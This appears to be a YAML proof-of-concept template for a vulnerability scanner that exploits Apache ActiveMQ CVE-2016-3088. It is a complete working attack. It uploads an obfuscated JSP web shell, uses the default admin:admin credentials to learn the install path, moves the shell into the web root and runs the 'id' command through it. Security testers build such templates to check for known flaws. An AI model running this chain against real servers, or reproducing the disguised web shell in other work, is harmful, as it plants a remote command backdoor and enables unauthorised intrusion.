name: poc-yaml-ActiveMQ-cve-2016-3088
description: "任意文件上传,执行id命令"
alwaysExecute: false
matchCount: 4
rules:
  - method: PUT
    path: /fileserver/366.txt
    headers:
      Content-Type: text/xml    
    body: >-
      <%@ page contentType="text/html;charset=UTF-8" language="java" %>
       <%
          if(request.getParameter("cmd") != null) {
              Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
              // exec getRuntime
              Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd"));
              java.io.InputStream in = e.getInputStream();
              int a = -1;
              byte[] b = new byte[2048];
              out.print("<pre>");
              while ((a = in.read(b)) != -1) {
                  out.println(new String(b));
              }
              out.print("</pre>");
          }
       %>
    expression:
      status: 204
  - method: GET
    path: /admin/test/index.jsp
    search: >-
      activemq.home=(?P<home>.*?),
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    expression:
      status: 200
  - method: MOVE
    path: /fileserver/366.txt
    headers:
      Destination: file://{{home}}/webapps/api/366.jsp
    expression:
      status: 204
  - method: GET
    path: /api/366.jsp?cmd=id
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=    
    expression:
      status: 200
      body_all: ["uid="]
